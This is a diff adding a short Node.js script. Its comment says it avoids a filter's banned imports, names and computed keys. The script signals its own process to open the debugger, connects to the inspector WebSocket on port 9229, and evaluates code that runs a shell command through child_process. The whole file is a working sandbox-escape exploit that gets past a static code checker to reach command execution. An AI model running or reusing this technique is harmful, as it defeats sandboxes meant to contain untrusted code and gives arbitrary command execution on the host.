@@ -1,0 +1,9 @@
+// R3: no banned import, no banned name, no computed key. process.kill + fetch + global WebSocket.
+process.kill(process.pid, "SIGUSR1");
+await new Promise((r) => setTimeout(r, 500));
+const list = await (await fetch("http://127.0.0.1:9229/json/list")).json();
+const ws = new WebSocket(list[0].webSocketDebuggerUrl);
+await new Promise((r) => ws.addEventListener("open", r));
+ws.send(JSON.stringify({ id: 1, method: "Runtime.evaluate",
+  params: { expression: 'process.getBuiltinModule("child_process").execSync("id").toString()' } }));
+ws.addEventListener("message", (m) => { console.log("RESULT", JSON.parse(m.data).result.result.value); process.exit(0); });
